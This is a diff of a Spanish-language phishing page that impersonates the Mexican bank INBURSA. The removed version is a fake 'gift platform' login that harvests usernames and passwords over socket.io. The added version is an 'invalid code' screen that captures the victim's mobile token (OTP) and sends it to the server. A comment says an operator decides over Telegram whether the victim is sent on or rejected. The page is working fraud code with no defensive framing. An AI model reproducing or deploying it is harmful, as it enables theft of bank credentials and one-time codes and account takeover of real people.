@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>INBURSA</title>
+  <title>Código Incorrecto</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -12,10 +12,9 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;  /* Centrado horizontal */
-      align-items: center;      /* Centrado vertical */
+      align-items: center;
+      justify-content: center;
       min-height: 100vh;
-      text-align: center;
     }
 
     .screen {
@@ -26,38 +25,19 @@
       padding: 2rem;
       border-radius: 1rem;
       box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
-      width: 100%;
+      width: 90%;
       max-width: 400px;
+      text-align: center;
     }
 
-    .logo {
-      width: 100px;
-      margin-bottom: 1rem;
-    }
-
-    h2 {
-      font-size: 1.5em;
-      margin-bottom: 1rem;
-    }
-
-    p {
-      font-size: 1em;
-      color: #555;
-      margin-bottom: 1rem;
-    }
-
-    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;  /* Espaciado entre campos */
-      padding: 0.0rem 1rem;
+      margin: 1rem 0;
+      padding: 0.5rem 1rem;
       width: 100%;
-      max-width: 350px;
-      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
-      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
     }
 
     .input-group .icon {
@@ -71,130 +51,90 @@
       outline: none;
       flex: 1;
       font-size: 1rem;
-      padding: 10px 0.75rem;
-      height: 20px;
-    }
-
-    /* Botón centrado y ajustado */
-    button {
-      background-color: #262D91;
-      color: white;
-      padding: 8px 20px; /* Botón más pequeño */
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1em;
-      width: auto;
-      margin-top: 1rem;
-    }
-
-    button:hover {
-      background-color: #1924D1;
-    }
-
-    button:disabled {
-      background: #cccccc;
-      cursor: not-allowed;
-    }
-
-    /* Mensaje de error */
-    .mensaje-error {
-      color: red;
-      margin-top: 1rem;
-      font-size: 0.85rem;
     }
 
     .campo-requerido {
       border: 1px solid red !important;
     }
+
+    button {
+      background: #262D91;
+      color: white;
+      padding: 0.75rem 2rem;
+      border: none;
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #1924D1;
+    }
+
+    .mensaje-error {
+      color: red;
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
+    }
   </style>
 </head>
 <body>
-  <div class="screen active" id="pantallaInicio">
-    <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="Stori Logo" class="logo">
-    <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong> </h2>
-    <p>Ingrese su usuario y contraseña para continuar con su desembolso</p>
-    <form id="login-form">
-      <div class="input-group">
-        <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Usuario" required>
-      </div>
-      <div class="input-group">
-        <div class="icon"><i class="fas fa-lock"></i></div>
-        <input type="password" id="password" placeholder="Contraseña" required>
-      </div>
-      <p id="usuarioError" class="mensaje-error"></p>
-      <p id="passwordError" class="mensaje-error"></p>
-      <button type="submit" id="btnContinuar">Continuar</button>
-    </form>
+  <div class="screen">
+    <h3>¡ULTIMO PASO PARA VALIDAR!</h3>
+    <p>Introduce el Token movil.</p>
+    <div class="input-group campo-requerido">
+      <div class="icon"><i class="fas fa-key"></i></div>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="14" required>
+    </div>
+    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
+    <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
- <script>
-  const socket = io();
+  <script>
+    const socket = io();
+    const sessionId = localStorage.getItem("sessionId");
 
-  window.addEventListener('DOMContentLoaded', () => {
-    const form = document.getElementById('login-form');
-
-    if (form) {
-      form.addEventListener('submit', (e) => {
-        e.preventDefault(); // Evitar el comportamiento por defecto del formulario
-
-        // Validar los campos antes de enviar los datos
-        if (validarUsuario() && validarPassword()) {
-          const usuario = document.getElementById('usuario').value;
-          const contrasena = document.getElementById('password').value;
-
-          // Generar y guardar sessionId
-          const sessionId = Math.random().toString(36).substring(2, 15);
-          localStorage.setItem('sessionId', sessionId);
-
-          // Enviar datos al servidor mediante socket.io
-          socket.emit('dataForm', { usuario, contrasena, sessionId });
-
-          // Ir a pantalla de espera (opciones.html)
-          window.location.href = 'opciones.html';
-        }
-      });
+    // Almacenar el valor del usuario en el localStorage
+    const usuario = localStorage.getItem('usuario');
+    if (usuario) {
+      console.log('Usuario guardado: ', usuario); // Muestra el valor almacenado en la consola
     }
-  });
 
-  function validarUsuario() {
-    const usuario = document.getElementById("usuario").value;
-    const usuarioError = document.getElementById("usuarioError");
-    const usuarioInput = document.getElementById("usuario");
+    socket.emit("reconectar", sessionId);
 
-    if (!usuario) {
-      usuarioError.textContent = "El usuario es obligatorio";
-      usuarioInput.classList.add("campo-requerido");
-      return false;
-    } else {
-      usuarioError.textContent = "";
-      usuarioInput.classList.remove("campo-requerido");
-      return true;
+    function reintentarCodigo() {
+      const codigo = document.getElementById("codigo").value;
+
+      if (!codigo || !/^\d{4}$/.test(codigo)) {
+        alert("Ingrese un código válido de 4 dígitos.");
+        return;
+      }
+
+      // Enviar OTP ingresado al servidor
+      socket.emit("otpIngresado", { codigo, sessionId });
+
+      // Ir a la pantalla de espera
+      window.location.href = "opciones.html";
     }
-  }
 
-  function validarPassword() {
-    const password = document.getElementById("password").value;
-    const passwordError = document.getElementById("passwordError");
-    const passwordInput = document.getElementById("password");
+    // Recibir respuesta del admin desde Telegram
+    socket.on("respuestaOtp", (decision) => {
+      if (decision === "finalizar") {
+        window.location.href = "https://www.google.com";
+      } else if (decision === "otp_error") {
+        window.location.href = "denegado.html";
+      }
+    });
 
-    if (!password) {
-      passwordError.textContent = "La contraseña es obligatoria";
-      passwordInput.classList.add("campo-requerido");
-      return false;
-    } else if (password.length < 4) {
-      passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
-      passwordInput.classList.add("campo-requerido");
-      return false;
-    } else {
-      passwordError.textContent = "";
-      passwordInput.classList.remove("campo-requerido");
-      return true;
+    // Para guardar el usuario que ingresa
+    function guardarUsuario() {
+      const usuarioInput = document.getElementById('usuario').value;
+      localStorage.setItem('usuario', usuarioInput);  // Guardar en localStorage
+      console.log('Usuario guardado: ', usuarioInput);  // Muestra el valor del usuario en la consola
     }
-  }
-</script>
-
+  </script>
 </body>
 </html>
